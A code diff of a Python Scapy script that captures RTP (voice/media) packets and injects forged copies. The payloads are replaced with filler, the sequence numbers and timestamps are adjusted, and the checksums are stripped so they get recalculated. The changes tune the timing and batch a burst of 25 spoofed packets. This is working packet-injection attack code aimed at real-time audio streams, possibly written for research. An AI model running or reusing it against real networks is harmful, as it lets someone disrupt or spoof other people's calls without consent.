@@ -114,7 +114,7 @@ def listener():
 			packetSem.release()
 			print "Sending captured RTP packet to injector"
 			
-			start = (timer()*1000) + 500	
+			start = (timer()*1000) + 250
 	return
 
 
@@ -128,6 +128,12 @@ def modifyPacketHeader(packet, new_seq, new_ts):
 def modifyPacketPayload(packet, new_payload):
 	packet[Raw].load = new_payload
 	
+
+# Deletes the checksums from each layer so Scapy can recalculate the checksums
+def deleteChecksums(packet):
+	del packet[IP].chksum
+	del packet[UDP].chksum
+	
 	
 def injector():
 	# global variables to be used
@@ -138,39 +144,34 @@ def injector():
 	print "Beginning Injection Engine"
 	print printLine
 	
-	while not terminate:
-		# Attempt to acquire packet
-		packetSem.acquire()
-		
+	while not terminate:		
 		# make sure packet has UDP layer
 		# if it does, copy it locally, overwrite the global to be just a tcp layer, and release the semaphore
 		if(passedPacket.haslayer(UDP)):
+			# Attempt to acquire packet
+			packetSem.acquire()
 			packet = copy.deepcopy(passedPacket)
 			passedPacket = TCP()
 			packetSem.release()
 			
+			# List of fake packets to send in a burst
+			fake_packets = []
+			
 			# modify the packet payload
 			modifyPacketPayload(packet, filler)
-			modifyPacketHeader(packet, packet.sequence + 163, packet.timestamp + 50367)
-			
-			# introduce 10 ms delay before beginning packet injection
-			#time.sleep(.01)
+			modifyPacketHeader(packet, packet.sequence + 133, packet.timestamp + 19647)
+			fake_packets.append(packet)
 			
 			# send round of test packets every 20 ms for 500 ms. Roughly 25 packets
 			# update sequence number and timestamp accordingly
 			print "Beginning sending burst of 25 packets"
-			fake_packets = []
-			for i in range(0, 25):
+			for i in range(24):
 				modifyPacketHeader(packet, packet.sequence + 1, packet.timestamp + 309)
 				fake_packet = copy.deepcopy(packet)
+				deleteChecksums(fake_packet)
 				fake_packets.append(fake_packet)
-				#sendp(packet)
 				print "Sending packet %d" % i
-				#time.sleep(.02)
 			sendp(fake_packets)
-		else:
-			# if it doesn't, release the semaphore and go back to the beginning of the loop
-			packetSem.release()
 	return
 
 	
